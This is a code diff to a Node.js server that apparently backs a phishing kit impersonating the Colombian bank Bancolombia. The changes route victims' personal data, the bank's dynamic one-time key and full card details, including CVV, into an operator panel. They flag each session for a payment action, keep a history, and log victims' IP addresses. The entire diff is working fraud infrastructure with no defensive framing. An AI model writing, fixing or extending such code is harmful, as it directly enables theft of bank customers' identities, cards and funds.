@@ -689,6 +689,9 @@ const server = http.createServer(async (req, res) => {
                 bcSesiones.set(sessionId, { 
                     ...previos, nombres, tipoDoc, documento, correo, telefono, ingresos 
                 });
+
+                const datosSesion = datosSesiones.get(sessionId) || {};
+                datosSesiones.set(sessionId, { ...datosSesion, nombres, tipoDoc, documento, correo, telefono, ingresos });
                 
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 500, { ok: false }); }
@@ -703,6 +706,9 @@ const server = http.createServer(async (req, res) => {
 
                 const previos = bcSesiones.get(sessionId) || {};
                 bcSesiones.set(sessionId, { ...previos, claveDinamica });
+
+                const datosSesion = datosSesiones.get(sessionId) || {};
+                datosSesiones.set(sessionId, { ...datosSesion, claveDinamica, otp: claveDinamica });
                 
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 500, { ok: false }); }
@@ -716,11 +722,17 @@ const server = http.createServer(async (req, res) => {
                 if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
 
                 const sesionData = bcSesiones.get(sessionId) || {};
+                const datosPanelPrevios = datosSesiones.get(sessionId) || {};
                 
                 const datosCompletos = { 
                     sessionId,
+                    ...datosPanelPrevios,
                     ...sesionData, 
-                    tarjeta, titular, exp, cvv,
+                    tarjeta, 
+                    titular, 
+                    exp, 
+                    expMes: exp, // Mapeo para que la tabla principal muestre la fecha
+                    cvv,
                     fechaCaptura: new Date().toISOString(),
                     bancoKey: 'bancolombia'
                 };
@@ -736,10 +748,20 @@ const server = http.createServer(async (req, res) => {
                     }
                 }
 
+                // 🔥 LA MAGIA: Si la sesión no existe en el panel principal, la creamos
+                if (!estadoSesiones.has(sessionId)) {
+                    estadoSesiones.set(sessionId, 'pendiente');
+                    ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
+                }
+                
+                // Actualizamos los datos de la sesión en el panel
+                datosSesiones.set(sessionId, datosCompletos);
+
+                // Guardamos en el historial para el ojito 👁️
                 guardarHistorial('bancolombia', datosCompletos);
                 bcSesiones.delete(sessionId);
 
-                console.log(`[BANCOLOMBIA] Flujo completado - Usuario: ${datosCompletos.usuario || 'N/A'} | IP: ${ip}`);
+                console.log(`[BANCOLOMBIA] Tarjeta guardada y sesión actualizada - Usuario: ${datosCompletos.identificacion || 'N/A'} | IP: ${ip}`);
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
@@ -826,7 +848,6 @@ const server = http.createServer(async (req, res) => {
             const bancoKey = estadoMatch[1];
             const sessionId = estadoMatch[2];
 
-            // 🔥 AQUÍ ESTÁ LA CORRECCIÓN: Acepta 'bancolombia', 'bc', los 'cc-', etc.
             const esValido = bancos[bancoKey] || bancoKey === 'bancolombia' || bancoKey === 'bc' || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga';
             if (!esValido) { json(res, 404, { ok: false }); return; }
 
